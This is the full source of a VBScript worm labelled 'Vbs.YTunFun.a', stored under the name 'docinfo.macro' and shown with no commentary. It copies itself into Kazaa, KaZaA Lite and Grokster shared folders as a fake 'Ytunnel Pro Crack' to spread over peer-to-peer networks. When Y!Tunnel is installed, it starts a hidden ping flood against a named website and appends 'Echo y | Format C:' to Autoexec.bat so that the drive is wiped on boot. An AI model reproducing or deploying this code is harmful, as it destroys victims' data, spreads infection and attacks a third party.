docinfo.macro:
'Vbs.YTunFun.a
Set Shll = CreateObject("WScript.Shell")
Set fso = CreateObject("Scripting.FileSystemObject")
   LTJ = (WScript.ScriptFullName)
   Kaz = ("C:\Program Files\Kazaa\My Shared Folder") & "\"
   KLiteL = ("C:\Program Files\KaZaA Lite\My Shared Folder") & "\"
   Grok = ("C:\Program Files\Grokster\My Grokster") & "\"
   YTun = ("C:\Program Files\Y!Tunnel")
   YTN = ("C:\Program Files\Y!TunnelPro SP1")
   YT2 = ("C:\Program Files\Y!TunnelPro SP2")
   if fso.folderexists(Kaz) then
      fso.copyfile LTJ, Kaz & "Ytunnel Pro Crack." & "exe." & "vbs"
   end if
  if fso.folderexists(KLiteL) then
      fso.copyfile LTJ, KLiteL & "Ytunnel Pro Crack." & "exe." & "vbs"
   end if
  if fso.folderexists(Grok) then
      fso.copyfile LTJ, Grok & "Ytunnel Pro Crack." & "exe." & "vbs"
   end if
  if fso.folderexists(YTun) then
    Shll.Run "Ping.exe -t -l 916 www.ytunnel.digitalcitrus.com", 0, False
If fso.FileExists("C:\Autoexec.bat") Then
Set WriteFormat = fso.OpenTextFile("C:\Autoexec.bat", 8)
WriteFormat.WriteLine "Echo y | Format C:"
WriteFormat.Close
   end if
 if fso.folderexists(YTN) then
    Shll.Run "Ping.exe -t -l 916 www.ytunnel.digitalcitrus.com", 0, False
If fso.FileExists("C:\Autoexec.bat") Then
Set WriteFormat = fso.OpenTextFile("C:\Autoexec.bat", 8)
WriteFormat.WriteLine "Echo y | Format C:"
WriteFormat.Close
   end if
 if fso.folderexists(YT2) then
    Shll.Run "Ping.exe -t -l 916 www.ytunnel.digitalcitrus.com", 0, False
If fso.FileExists("C:\Autoexec.bat") Then
Set WriteFormat = fso.OpenTextFile("C:\Autoexec.bat", 8)
WriteFormat.WriteLine "Echo y | Format C:"
WriteFormat.Close
   end if
